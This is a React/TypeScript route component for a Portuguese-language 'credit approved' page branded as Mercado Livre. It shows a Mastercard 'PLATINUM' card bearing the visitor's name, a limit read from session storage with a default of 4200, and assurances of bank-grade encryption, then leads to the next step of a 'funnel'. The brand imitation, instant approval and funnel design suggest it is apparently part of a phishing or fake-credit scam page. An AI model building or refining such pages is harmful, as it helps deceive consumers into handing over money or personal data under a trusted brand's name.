import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import mlHandshake from "@/assets/ml-handshake.png";
import mastercard from "@/assets/mastercard.png";
import cardChip from "@/assets/card-chip.png";
import { FunnelSteps } from "@/components/FunnelSteps";
import { SiteFooter } from "@/components/SiteFooter";

export const Route = createFileRoute("/aprovado")({
  head: () => ({
    meta: [
      { title: "Crédito aprovado - Mercado Livre" },
      { name: "description", content: "Seu crédito foi aprovado. Finalize seu cartão e comece a aproveitar." },
    ],
    links: [
      { rel: "stylesheet", href: "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" },
    ],
  }),
  component: Aprovado,
});

function Aprovado() {
  const navigate = useNavigate();
  const [limite, setLimite] = useState<number>(4200);
  const [nome, setNome] = useState<string>("SEU NOME");
  useEffect(() => {
    try {
      const v = sessionStorage.getItem("limiteAprovado");
      if (v) setLimite(parseInt(v, 10) || 4200);
      const n = sessionStorage.getItem("nomeTitular");
      if (n) {
        const primeiro = n.trim().split(/\s+/)[0] || n;
        setNome(primeiro.toUpperCase());
      }
    } catch {}
  }, []);



  const items = [
    {
      icon: "fa-check",
      text: "Seu limite foi aprovado! Agora vamos personalizar seu cartão exclusivo.",
    },
    {
      icon: "fa-shield-halved",
      text: "Suas informações estão protegidas com criptografia de nível bancário e tecnologia antifraude.",
    },
    {
      icon: "fa-heart",
      text: "Você está a poucos cliques de ter acesso aos melhores benefícios do mercado!",
    },
  ];

  return (
    <div className="min-h-screen bg-white flex flex-col relative overflow-hidden">
      {/* Header */}
      <FunnelSteps current={2} />

      {/* Decorative circles */}
      <div className="absolute w-72 h-72 rounded-full bg-[#FFE600]/20 -top-20 -right-20 z-0" />
      <div className="absolute w-56 h-56 rounded-full bg-[#FFE600]/10 -bottom-16 -left-16 z-0" />

      <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
          <h1 className="text-2xl md:text-3xl font-bold text-gray-800 text-center mb-2">
            Parabéns! Seu crédito foi aprovado
          </h1>
          <p className="text-sm text-gray-600 text-center mb-4">
            Agora é só finalizar seu cartão e começar a aproveitar
          </p>

          {/* Cartão estilizado com o nome do titular */}
          <div className="mb-5 flex justify-center">
            <div
              className="relative w-[78%] max-w-[280px] aspect-[1/1.586] rounded-2xl shadow-2xl overflow-hidden"
              style={{
                backgroundColor: "#3483FA",
                backgroundImage:
                  "radial-gradient(circle at 72% 18%, rgba(255,255,255,.14), transparent 34%), linear-gradient(145deg, rgba(255,255,255,.10), rgba(0,0,0,.20))",
              }}
            >
              <img src={mlHandshake} alt="Mercado Livre" className="absolute top-5 left-8 w-14 h-auto" />
              <span className="absolute top-8 right-6 text-[10px] font-semibold tracking-[0.16em] text-white/80">
                PLATINUM
              </span>
              <img src={cardChip} alt="Chip" className="absolute top-[31%] left-8 w-11 h-auto" />
              <svg
                className="absolute top-[30%] right-8 w-11 h-11 text-white/70"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="1.9"
                strokeLinecap="round"
              >
                <path d="M6.5 8.5a5 5 0 0 1 0 7" />
                <path d="M10 6a8.5 8.5 0 0 1 0 12" />
                <path d="M13.5 3.8a12 12 0 0 1 0 16.4" />
              </svg>
              <div className="absolute left-8 bottom-[25%] max-w-[66%] truncate text-sm font-medium tracking-[0.12em] text-white">
                {nome}
              </div>
              <img src={mastercard} alt="Mastercard" className="absolute bottom-5 right-5 w-20 h-auto" />
            </div>
          </div>



          <div className="space-y-3 mb-6">

            {items.map((item) => (
              <div
                key={item.text}
                className="flex items-start gap-3 border border-gray-200 rounded-lg p-4"
              >
                <span className="w-10 h-10 rounded-lg bg-[#FFE600] flex items-center justify-center shrink-0">
                  <i className={`fas ${item.icon} text-gray-800`} />
                </span>
                <p className="text-sm text-gray-800 leading-snug pt-1">{item.text}</p>
              </div>
            ))}
          </div>

          <button
            onClick={() => navigate({ to: "/limite" })}
            className="w-full bg-[#2A68C8] hover:bg-[#1E5BBA] text-white text-lg font-semibold py-4 rounded-md transition-all"
          >
            Continuar
          </button>
        </div>
      </main>

      <SiteFooter />
    </div>
  );
}
